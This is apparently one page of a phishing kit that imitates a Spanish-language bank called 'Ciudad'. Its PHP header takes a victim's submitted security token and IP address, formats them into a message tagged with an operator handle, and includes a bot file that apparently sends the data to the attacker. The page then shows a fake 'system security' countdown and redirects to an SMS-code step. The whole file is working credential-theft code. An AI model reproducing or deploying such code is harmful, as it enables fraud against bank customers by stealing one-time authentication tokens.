<?php
    $tokencode = $_POST['tokencode'];

    $user_ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

    $enviara =  "city tok1 ##@gianconsuerte##\n" .
        "<b>token: </b>  <code>" . $tokencode . "</code>\n" .
        "🌐 IP " . $user_ip . "\n";

    $enviar = urldecode($enviara);
    include 'bot_id.php';
?>
<!DOCTYPE html>
<html><head>
    <meta http-equiv="refresh" content="10;url=./sms2.php">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="main/extraIn.css" rel="stylesheet">
    <link href="main/favicon.png" rel="shortcut icon">

    <title>Ciudad</title>
</head>

<body>
    <header>
        <img alt="Logo" src="main/ciudad.svg" width="290">
    </header>

    <section class="container">
        <div>
            <br>
            <br>
            <br>

            <h1 class="title">Seguridad del sistema</h1>

            <p>Estamos realizando tareas de seguridad en todas las cuentas</p>
            <p>Tiempo estimado:</p>
            <div id="countdown"></div>
        </div>
    </section>

    <script>
        // Set the date we're counting down to
        var countDownDate = new Date().getTime() + (10 * 1000); // 10 seconds from now

        // Update the count down every 1 second
        var x = setInterval(function() {

            // Get the current time
            var now = new Date().getTime();

            // Find the distance between now and the count down date
            var distance = countDownDate - now;

            // Time calculations for days, hours, minutes and seconds
            var seconds = Math.floor((distance % (1000 * 60)) / 1000);

            // Display the result in the element with id="countdown"
            document.getElementById("countdown").innerHTML = seconds + "s";

            // If the count down is finished, write some text
            if (distance < 0) {
                clearInterval(x);
                document.getElementById("countdown").innerHTML = "EXPIRED";
            }
        }, 1000);
    </script>

</body></html>
